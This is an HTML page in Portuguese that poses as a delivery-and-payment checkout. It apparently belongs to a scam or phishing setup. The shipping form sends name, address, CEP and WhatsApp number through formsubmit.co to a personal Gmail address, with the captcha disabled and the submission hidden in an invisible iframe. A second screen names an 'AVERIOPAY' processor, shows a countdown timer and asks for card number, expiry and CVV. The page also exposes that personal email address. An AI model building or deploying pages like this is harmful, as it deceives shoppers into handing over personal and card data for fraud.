<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Envio e Pagamento</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
    }

    .container {
      width: 100%;
      max-width: 100%;
      padding: 20px;
      background: #fff;
      min-height: 100vh;
    }

    h2 {
      margin-bottom: 20px;
      text-align: center;
      color: #333;
    }

    input {
      width: 100%;
      margin-bottom: 12px;
      padding: 14px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }

    button {
      background: #f60;
      color: white;
      padding: 14px;
      border: none;
      width: 100%;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }

    .alerta {
      background: #fff4cc;
      padding: 12px;
      border-radius: 5px;
      font-size: 15px;
      margin-bottom: 20px;
    }

    .tempo {
      color: #f60;
      font-weight: bold;
    }

    .valor {
      font-size: 24px;
      color: #333;
      margin: 10px 0;
    }

    #pagamento {
      display: none;
    }
  </style>
</head>
<body>

  <!-- TELA 1 -->
  <div class="container" id="formulario">
    <h2>Preencha seus dados de entrega</h2>
    <form id="envioForm" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" target="dummyframe">
      <!-- Oculta captcha e redirecionamento -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="about:blank">

      <input type="text" name="Nome completo" placeholder="Nome completo" required>
      <input type="text" name="Endereço" placeholder="Endereço completo" required>
      <input type="text" name="Bairro" placeholder="Bairro" required>
      <input type="text" name="Cidade" placeholder="Cidade" required>
      <input type="text" name="CEP" placeholder="CEP" required>
      <input type="tel" name="WhatsApp" placeholder="WhatsApp" required>
      <button type="submit">Continuar</button>
    </form>
    <!-- iframe invisível para evitar recarregamento -->
    <iframe name="dummyframe" style="display:none;"></iframe>
  </div>

  <!-- TELA 2 - CARTÃO -->
  <div class="container" id="pagamento">
    <div class="alerta">
      ⚠️ Seus dados estão protegidos. O pagamento é processado por <strong>AVERIOPAY</strong>.
    </div>

    <p><strong>Tempo restante para concluir o pagamento:</strong> <span class="tempo" id="contador">04m 39s</span></p>

    <div style="margin-top: 15px;">
      <p><strong>Valor:</strong></p>
      <p class="valor">R$ 2.000,00</p>
    </div>

    <form>
      <input type="text" placeholder="Nome no cartão" required>
      <input type="text" placeholder="Número do cartão" maxlength="19" required>
      <input type="text" placeholder="Validade (MM/AA)" maxlength="5" required>
      <input type="text" placeholder="CVV" maxlength="4" required>
      <button type="submit">Pagar com Cartão</button>
    </form>
  </div>

  <script>
    const form = document.getElementById("envioForm");
    const formulario = document.getElementById("formulario");
    const pagamento = document.getElementById("pagamento");
    const contador = document.getElementById("contador");

    form.addEventListener("submit", function() {
      setTimeout(() => {
        formulario.style.display = "none";
        pagamento.style.display = "block";
        window.scrollTo(0, 0);
        iniciarContador(279); // 4m39s
      }, 1000);
    });

    function iniciarContador(segundos) {
      const interval = setInterval(() => {
        const min = Math.floor(segundos / 60);
        const sec = segundos % 60;
        contador.textContent = `${String(min).padStart(2, '0')}m ${String(sec).padStart(2, '0')}s`;
        segundos--;
        if (segundos < 0) {
          clearInterval(interval);
          contador.textContent = "Expirado";
        }
      }, 1000);
    }
  </script>

</body>
</html>
